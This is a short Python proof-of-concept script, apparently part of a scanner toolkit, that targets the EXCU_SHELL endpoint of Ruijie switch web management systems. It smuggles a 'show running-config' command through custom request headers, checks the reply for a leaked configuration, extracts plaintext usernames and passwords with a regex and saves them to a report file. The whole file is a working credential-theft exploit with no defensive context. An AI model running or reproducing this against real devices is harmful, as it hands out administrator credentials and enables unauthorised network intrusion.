import re

import requests
import time
import buter
import wirtefile

filename = "./reps/锐捷交换机WEB管理系统EXCU_SHELL密码信息泄漏-"+str(time.strftime("%Y-%m-%d", time.localtime()))

headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36',
		    'Cmdnum': "'1'",
      		'Command1': 'show running-config',
      		'Confirm1': 'n'
      }
poc = "/EXCU_SHELL"
def RJSWEXCUxxxl(url):
    try:
        response = requests.get(url=url + poc, headers=headers, verify=False, timeout=5)
        if response.status_code == 200 and 'Building configuration' in response.text:
            print(buter.colors.GREEN+  f"存在锐捷交换机WEB管理系统EXCU_SHELL密码信息泄漏 url : {url}" + buter.colors.END)
            match = re.search(r'user (.+) password 0 (.+)', response.text)
            if match:
                extracted_field = match.group(0)
                print(buter.colors.GREEN + f"username & password Find : {extracted_field}" + buter.colors.END)
                reptext = url + "  username & password : " + extracted_field
            else:
                print(buter.colors.LAN + f"username & password Field not found : {url}" + buter.colors.END)
            wirtefile.writefiles(filename,reptext)
        else:
            print(buter.colors.RED+ f"未发现锐捷交换机WEB管理系统EXCU_SHELL密码信息泄漏漏洞 url : {url} " + buter.colors.END)
    except Exception as e:
        print(buter.colors.END+f"ERROR : {e}"+buter.colors.END)
